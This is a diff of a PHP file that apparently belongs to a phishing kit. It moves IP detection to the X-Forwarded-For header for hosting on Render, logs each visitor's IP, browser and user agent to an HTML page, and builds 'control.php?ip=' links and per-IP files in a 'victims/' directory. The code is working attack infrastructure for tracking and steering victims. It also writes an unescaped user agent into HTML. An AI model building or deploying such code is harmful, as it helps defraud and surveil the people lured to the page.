@@ -1,40 +1,58 @@
 <?php
 
-    if (session_status() == PHP_SESSION_NONE) {
+if (session_status() == PHP_SESSION_NONE) {
     session_start();
-    }
-    //error_reporting(0);
-    include("system/index.php");
-    require_once 'detect.php';
+}
+//error_reporting(0);
+include("system/index.php");
+require_once 'detect.php';
 
-    function get_client_ip() {
-        $client  = @$_SERVER['HTTP_CLIENT_IP'];
-        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
-        $remote  = $_SERVER['REMOTE_ADDR'];
-        if(filter_var($client, FILTER_VALIDATE_IP)) {
-            $ip = $client;
-        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
-            $ip = $forward;
-        } else {
-            $ip = $remote;
-        }
-        if( $ip == '::1' ) {
-            return '127.0.0.1';
-        }
-        return  $ip;
-    }
-
-    function visitors() {
-        $detect         = new BrowserDetection();
-        $ip             = $_SERVER['REMOTE_ADDR'];
-        $date           = date("Y-m-d H:i:s", time());
-        $usragent       = $_SERVER['HTTP_USER_AGENT'];
-        $browserName    = $detect->getName();
-        $browserVer     = $detect->getVersion();
-        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Desktop';
-        $platformName   = $detect->getPlatform();
+/**
+ * Get real client IP address, even when behind a reverse proxy (e.g., Render)
+ * 
+ * On Render, the app runs behind a load balancer/proxy, so $_SERVER['REMOTE_ADDR']
+ * returns 127.0.0.1. This function extracts the real IP from the X-Forwarded-For header.
+ * 
+ * @return string Real client IP address
+ */
+function get_client_ip() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    
+    // Check for X-Forwarded-For header (set by Render and most proxies)
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        // X-Forwarded-For can contain multiple IPs: client, proxy1, proxy2, ...
+        // The leftmost IP is the original client IP
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $first_ip = trim($ips[0]);
         
-        $str = "
+        if (filter_var($first_ip, FILTER_VALIDATE_IP)) {
+            $ip = $first_ip;
+        }
+    }
+    // Fallback to HTTP_CLIENT_IP (rarely used, but kept for compatibility)
+    elseif (isset($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    }
+    
+    // Normalize IPv6 localhost to IPv4
+    if ($ip == '::1') {
+        return '127.0.0.1';
+    }
+    
+    return $ip;
+}
+
+function visitors() {
+    $detect         = new BrowserDetection();
+    $ip             = get_client_ip();  // Use real IP instead of REMOTE_ADDR
+    $date           = date("Y-m-d H:i:s", time());
+    $usragent       = $_SERVER['HTTP_USER_AGENT'];
+    $browserName    = $detect->getName();
+    $browserVer     = $detect->getVersion();
+    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Desktop';
+    $platformName   = $detect->getPlatform();
+    
+    $str = "
         <div class='visitor-item'>
             <div class='visitor-header'>
                 <strong>🌐 $ip</strong>
@@ -47,16 +65,16 @@
                 <span class='user-agent'>🔍 " . substr($usragent, 0, 50) . "...</span>
             </div>
         </div>";
-        
-        if (!file_exists('visitors.html')) {
-            createVisitorsFile($str);
-        } else {
-            file_put_contents('visitors.html', $str, FILE_APPEND | LOCK_EX);
-        }
+    
+    if (!file_exists('visitors.html')) {
+        createVisitorsFile($str);
+    } else {
+        file_put_contents('visitors.html', $str, FILE_APPEND | LOCK_EX);
     }
+}
 
-    function createVisitorsFile($firstEntry) {
-        $html = '<!DOCTYPE html>
+function createVisitorsFile($firstEntry) {
+    $html = '<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -182,20 +200,20 @@
     </script>
 </body>
 </html>';
-        
-        file_put_contents('visitors.html', $html);
-    }
-
-    function get_steps_link() {
-        $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-        $x = pathinfo($url);
-        return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();
-    }
     
-    function reset_data() {
-        $fp = fopen('victims/'. get_client_ip() .'.txt', 'wb');
-        fwrite($fp, 0);
-        fclose($fp);
-    }
+    file_put_contents('visitors.html', $html);
+}
+
+function get_steps_link() {
+    $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    $x = pathinfo($url);
+    return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();
+}
+
+function reset_data() {
+    $fp = fopen('victims/'. get_client_ip() .'.txt', 'wb');
+    fwrite($fp, 0);
+    fclose($fp);
+}
 
 ?>
